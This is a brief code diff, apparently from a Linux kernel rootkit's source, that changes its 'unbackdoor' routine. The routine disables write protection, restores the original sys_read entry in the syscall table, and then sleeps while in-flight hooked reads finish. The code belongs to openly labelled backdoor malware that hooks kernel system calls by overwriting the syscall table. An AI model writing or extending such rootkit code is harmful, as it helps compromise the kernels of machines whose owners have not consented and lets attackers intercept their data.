@@ -1,4 +1,5 @@
 #include <linux/tty.h>
+#include <linux/delay.h>
 
 #include "common.h"
 #include "backdoor.h"
@@ -53,10 +54,16 @@ unbackdoor(void)
     }
 
     if (sys_read) {
-        while (atomic_read(&read_count) > 0);
         disable_protection();
         sys_calls[__NR_read] = (void *)sys_read;
         enable_protection();
+
+        int cur;
+
+        while ((cur = atomic_read(&read_count)) > 0) {
+            DEBUG_INFO("Waiting for %d tasks", cur);
+            msleep(250);
+        }
     }
 }
 
